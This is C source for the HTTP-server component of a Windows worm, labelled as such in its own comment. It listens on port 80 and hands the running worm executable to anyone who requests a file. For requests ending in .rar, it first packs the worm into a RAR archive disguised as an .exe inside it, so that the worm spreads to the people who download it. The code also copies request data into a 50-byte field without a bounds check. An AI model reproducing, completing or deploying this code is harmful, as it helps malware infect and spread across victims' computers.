#include "stdafx.h"
#include "winsock2.h"
#include "prototypez.h"

/* http server of the worm */

typedef struct xSendFile
{
	SOCKET xsocket;
	char file[50];
}SendFileInfo;


DWORD WINAPI SendFile(LPVOID  SFI)
{
	SendFileInfo xSFI;
	HANDLE hfile;
	DWORD io_buffer,fsize,tmp=0xFFFFFFFF;
	char fb[4096];
	char httpheader[128];
	char filepath[MAX_PATH],wormfile[MAX_PATH];
	
	memcpy(&xSFI,SFI,sizeof(SendFileInfo));

	CharLower(xSFI.file);

	if(memcmp(xSFI.file+lstrlen(xSFI.file)-3,"rar",3)==0)	//check if file suffix is rar
	{
	
		GetModuleFileName(NULL,wormfile,MAX_PATH);

		GetTempPath(MAX_PATH,filepath);

		lstrcat(filepath,xSFI.file);

		memcpy(xSFI.file+lstrlen(xSFI.file)-3,"exe",3);

		DeleteFile(filepath);

		AddToRar(filepath,wormfile,xSFI.file,FILE_ATTRIBUTE_NORMAL); //create rar file

	}
	else
		GetModuleFileName(NULL,filepath,MAX_PATH); //send worm exe
	
	hfile=CreateFile(filepath,GENERIC_READ,FILE_SHARE_READ,NULL,
			OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);	//open file

	if(hfile!=INVALID_HANDLE_VALUE)
	{
	
		fsize=GetFileSize(hfile,&tmp);

		wsprintf(httpheader,
			"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection:\tclose\r\nContent-Type:\tapplication;\r\n\r\n",
			fsize);

		send(xSFI.xsocket,httpheader,lstrlen(httpheader),0);

		do
		{
			ReadFile(hfile,&fb,sizeof(fb),&io_buffer,NULL);
			send(xSFI.xsocket,fb,io_buffer,0);
		}
		while(io_buffer>0);

		Sleep(2000);

		CloseHandle(hfile);
	}

	closesocket(xSFI.xsocket);

	return 1;
}

DWORD WINAPI Http_Server(LPVOID xVoid)
{
	int xrecv,i;
	SendFileInfo SFI;
	WSADATA wsd;
	SOCKET shttp,shttp_out;
	sockaddr_in xsin;
	char httpbuf[256];
	char xrequest[MAX_PATH];


	if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
	{
		shttp=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(shttp!=INVALID_SOCKET)
		{
		
			xsin.sin_port=htons(80);
			xsin.sin_family=AF_INET;
			xsin.sin_addr.s_addr=INADDR_ANY;

			if(bind(shttp,(sockaddr *)&xsin,sizeof(xsin))!=SOCKET_ERROR)
			{
				for(;;) 
				{
					if(listen(shttp,1)!=SOCKET_ERROR)
					{
						shttp_out=accept(shttp,NULL,NULL);
					
						xrecv=recv(shttp_out,httpbuf,sizeof(httpbuf),0);
						
						if(memcmp(httpbuf,"GET /",5)==0)
						{
							for(i=0;i<sizeof(xrequest);i++)
							{
								if(httpbuf[i+5]==0x0D || httpbuf[i+5]==0x20)
									break;
								xrequest[i]=httpbuf[i+5];		//+5 skip the GET request
							}

							xrequest[i]=NULL;
				
							//create thread to transfer the file
							SFI.xsocket=shttp_out;
							lstrcpy(SFI.file,xrequest);
							XThread(SendFile,&SFI);

						}

						memset(xrequest,0,sizeof(xrequest));
						memset(httpbuf,0,sizeof(httpbuf));
					}
				}
			}
		}
	}	
	return 1;
}